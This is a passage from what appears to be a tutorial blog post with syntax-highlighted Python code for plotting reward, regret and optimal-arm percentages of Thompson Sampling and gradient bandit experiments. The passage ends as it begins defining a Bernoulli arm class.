            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>optimal_percent<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Percent"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Optimal action Selection"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

            <span class="token comment">#print the total regret accumulated over each experiment</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{} = {}: The total regret accumulated is {:.4f}."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>label<span class="token punctuation">,</span>para<span class="token punctuation">,</span>total_regret<span class="token punctuation">)</span><span class="token punctuation">)</span>

            <span class="token comment">#print the average percentage of plays in which the optimal arm is pulled </span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{} = {}: The average percentage of optimal arm is pulled is {:.4f}."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>label<span class="token punctuation">,</span>para<span class="token punctuation">,</span>average_percent<span class="token punctuation">)</span><span class="token punctuation">)</span>
            
            reward <span class="token operator">=</span> cumulative_reward<span class="token punctuation">[</span>num_slot<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            R<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reward<span class="token punctuation">)</span>
            Percentage<span class="token punctuation">.</span>append<span class="token punctuation">(</span>average_percent<span class="token punctuation">)</span>

    <span class="token comment">#Thompson Sampling</span>
    <span class="token keyword">elif</span> algo_name <span class="token operator">==</span> TS<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">for</span> para <span class="token keyword">in</span> para<span class="token punctuation">:</span>

            <span class="token comment">#run the algorithm</span>
            algo <span class="token operator">=</span> algo_name<span class="token punctuation">(</span>para<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>para<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            chosen_arm<span class="token punctuation">,</span>average_reward<span class="token punctuation">,</span>cumulative_reward <span class="token operator">=</span> 
                run_algorithm<span class="token punctuation">(</span>algo<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#plot the average reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>average_reward<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"beta"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            
            <span class="token comment">#plot the cumulative reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cumulative_reward<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"beta"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            <span class="token comment">#regret part</span>
            regret <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">)</span>
            average_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>
            optimal_num <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>
            optimal_percent <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#calculate the regret</span>
            <span class="token keyword">for</span> exper <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> slot <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    regret<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span> <span class="token operator">=</span> arm_mean<span class="token punctuation">[</span>optimal_arm<span class="token punctuation">]</span> <span class="token operator">-</span> arm_mean<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>chosen_arm<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
                    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>chosen_arm<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> optimal_arm<span class="token punctuation">:</span>
                        optimal_num<span class="token punctuation">[</span>slot<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
            optimal_percent <span class="token operator">=</span> optimal_num<span class="token operator">/</span>num_exper
            average_percent <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>optimal_percent<span class="token punctuation">)</span>
            average_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>regret<span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
            total_regret <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>average_regret<span class="token punctuation">)</span>
            cumulative_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span>average_regret<span class="token punctuation">)</span>

            <span class="token comment">#plot the regret as a function of time</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cumulative_regret<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"beta"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Regret"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Regret"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            <span class="token comment">#plot the optimal action percent as a function of slots</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>optimal_percent<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"beta"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Percent"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Optimal action Selection"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

            <span class="token comment">#print the total regret accumulated over each experiment</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"beta{}: The total regret accumulated over the experiment is {:.4f}."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>total_regret<span class="token punctuation">)</span><span class="token punctuation">)</span>

            <span class="token comment">#print the average percentage of plays in which the optimal arm is pulled </span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"beta{}: The average percentage of optimal arm is pulled is {:.4f}."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>average_percent<span class="token punctuation">)</span><span class="token punctuation">)</span>

            i <span class="token operator">+=</span> <span class="token number">1</span>
            reward <span class="token operator">=</span> cumulative_reward<span class="token punctuation">[</span>num_slot<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            R<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reward<span class="token punctuation">)</span>
            Percentage<span class="token punctuation">.</span>append<span class="token punctuation">(</span>average_percent<span class="token punctuation">)</span>

    <span class="token comment">#Gradient bandit</span>
    <span class="token keyword">elif</span> algo_name <span class="token operator">==</span> Gradient<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">for</span> para <span class="token keyword">in</span> para<span class="token punctuation">:</span>

            <span class="token comment">#run the algorithm</span>
            algo <span class="token operator">=</span> algo_name<span class="token punctuation">(</span>step_size <span class="token operator">=</span> para<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> baseline <span class="token operator">=</span> para<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> beta <span class="token operator">=</span> para<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            chosen_arm<span class="token punctuation">,</span>average_reward<span class="token punctuation">,</span>cumulative_reward <span class="token operator">=</span> 
                run_algorithm<span class="token punctuation">(</span>algo<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#plot the average reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>average_reward<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Average Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            
            <span class="token comment">#plot the cumulative reward</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cumulative_reward<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Reward"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            <span class="token comment">#regret part</span>
            regret <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">,</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">)</span>
            average_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>
            optimal_num <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>
            optimal_percent <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span>

            <span class="token comment">#calculate the regret</span>
            <span class="token keyword">for</span> exper <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_exper<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> slot <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    regret<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span> <span class="token operator">=</span> arm_mean<span class="token punctuation">[</span>optimal_arm<span class="token punctuation">]</span> <span class="token operator">-</span> arm_mean<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>chosen_arm<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
                    <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>chosen_arm<span class="token punctuation">[</span>exper<span class="token punctuation">,</span>slot<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> optimal_arm<span class="token punctuation">:</span>
                        optimal_num<span class="token punctuation">[</span>slot<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
            optimal_percent <span class="token operator">=</span> optimal_num<span class="token operator">/</span>num_exper
            average_percent <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>optimal_percent<span class="token punctuation">)</span>
            average_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>mean<span class="token punctuation">(</span>regret<span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
            total_regret <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>average_regret<span class="token punctuation">)</span>
            cumulative_regret <span class="token operator">=</span> np<span class="token punctuation">.</span>cumsum<span class="token punctuation">(</span>average_regret<span class="token punctuation">)</span>

            <span class="token comment">#plot the regret as a function of time</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>cumulative_regret<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Cumulative Regret"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Cumulative Regret"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>

            <span class="token comment">#plot the optimal action percent as a function of slots</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>plot<span class="token punctuation">(</span>optimal_percent<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>label<span class="token punctuation">}</span></span><span class="token string"> = </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>para<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">"Slots"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">"Percent"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">"Optimal action Selection"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>legend<span class="token punctuation">(</span>loc<span class="token operator">=</span><span class="token string">"lower right"</span><span class="token punctuation">)</span>
            axes<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>set_ylim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            
            <span class="token comment">#print the total regret accumulated over each experiment</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"para{}: The total regret accumulated over the experiment is {:.4f}."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>total_regret<span class="token punctuation">)</span><span class="token punctuation">)</span>

            <span class="token comment">#print the average percentage of plays in which the optimal arm is pulled </span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"para{}: The average percentage of optimal arm is pulled is {:.4f}."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>average_percent<span class="token punctuation">)</span><span class="token punctuation">)</span>

            i <span class="token operator">+=</span> <span class="token number">1</span>
            reward <span class="token operator">=</span> cumulative_reward<span class="token punctuation">[</span>num_slot<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            R<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reward<span class="token punctuation">)</span>
            Percentage<span class="token punctuation">.</span>append<span class="token punctuation">(</span>average_percent<span class="token punctuation">)</span>

    plt<span class="token punctuation">.</span>subplots_adjust<span class="token punctuation">(</span>hspace<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The best arm is Arm{} with mean = {}"</span>
        <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_arm<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>arm_mean<span class="token punctuation">[</span>optimal_arm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">max</span><span class="token punctuation">(</span>R<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>R<span class="token punctuation">)</span><span class="token punctuation">,</span> average_percent<span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>Percentage<span class="token punctuation">)</span>

</code></pre> 
<h3>
<a id="Step_2_Implementing_bandit_algorithms_332"></a>Step 2: Implementing bandit algorithms</h3> 
<p>Firstly we need to create a class named “Bern_arm” to represent the arms of bandit. This class enables us to obtain a random reward based on the mean of each arm.</p> 
<pre><code class="prism language-python"><span class="token keyword">class</span> <span class="token class-name">Bern_arm</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> mean<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>mean <span class="token operator">=</span> mean

    <span class="token keyword">def</span> <span class="token function">draw</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>

